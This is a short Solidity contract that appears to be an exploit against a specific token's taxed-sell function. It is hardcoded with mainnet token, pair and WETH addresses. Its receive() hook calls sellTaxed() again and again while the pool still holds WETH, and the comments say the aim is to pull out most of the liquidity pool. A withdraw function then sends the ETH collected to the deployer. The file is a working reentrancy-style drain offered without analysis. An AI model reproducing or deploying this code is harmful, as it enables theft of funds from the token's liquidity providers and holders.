// SPDX-License-Identifier: MIT
pragma solidity ^0.8.9;

interface IToken {
    function sellTaxed() external;
}

interface IERC20 {
    function balanceOf(address account) external view returns (uint);
}

contract Unicorn {

    address public token = 0xecE08402A6FC9ba95FB0D684FA9e41c6981C8D9C;
    address public pair = 0x31287Cde71cA8e5Ed7435398871599928D4BC3B9;
    address public WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    // You want the amount to be as low as possible so that most of the LP is withdrawn. But if it's too low the transaction loops too many times.
    uint public amount; // Make it 5% of current ETH in LP

    address public owner;

    constructor () {
      owner = msg.sender;
    }

    receive() external payable {
      if(IERC20(WETH).balanceOf(pair) >= amount) {
        IToken(token).sellTaxed();
      }
    }

    function normal() public {
      IToken(token).sellTaxed();
    }

    function horn(uint _amount) public {
      amount = _amount;
      IToken(token).sellTaxed();
    }

    function withdraw() public {
      require(msg.sender == owner);
      (bool sent, ) = msg.sender.call{value: address(this).balance}("");
      require(sent, "Failed to send Ether");
    }


}
